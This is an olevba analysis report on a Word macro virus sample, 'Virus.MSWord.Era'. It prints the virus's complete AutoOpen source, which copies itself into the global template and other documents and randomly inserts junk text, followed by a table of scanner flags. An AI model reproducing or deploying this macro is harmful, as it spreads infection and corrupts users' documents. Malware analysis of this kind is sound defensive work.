olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Era
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Era - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Era - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sk
Dim kiek
Dim i
Dim skaic
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "global:AutoOpen"
WordBasic.MacroCopy "global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
Rem _____________________________________________

sk = 0

WordBasic.StartOfDocument

While WordBasic.WordRight(1) <> 0
    sk = sk + 1
    WordBasic.WordRight
Wend

If sk > 99 Then

kiek = WordBasic.Int(Rnd() * 7)

For i = 1 To kiek
    If WordBasic.Int(Rnd() * 1000) < 200 Then
        WordBasic.StartOfDocument
        skaic = WordBasic.Int(Rnd() * sk)
        WordBasic.WordRight (skaic)
        WordBasic.Italic
        WordBasic.CharColor WordBasic.Int(Rnd() * 16)
        WordBasic.Insert " FeUrCaK "
    End If
Next i

End If

WordBasic.FileSave

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

